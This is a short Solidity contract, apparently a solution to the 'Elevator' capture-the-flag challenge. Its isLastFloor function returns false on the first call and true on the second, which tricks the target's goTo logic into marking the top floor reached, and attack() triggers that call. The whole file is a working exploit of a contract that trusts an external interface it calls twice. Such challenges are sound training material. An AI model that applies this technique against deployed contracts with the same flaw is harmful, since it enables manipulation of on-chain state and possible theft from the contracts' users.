// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
  bool public firstCall;
  IElevator public challenge;
  constructor(address challengeAddress) {
        challenge = IElevator(challengeAddress);
    }

  function isLastFloor(uint256 floor) external  returns (bool) {
    if (firstCall) {
        return true;
    }
    firstCall = true; 
    return false;
  }

  function attack() external payable {
        challenge.goTo(0);
    }

}
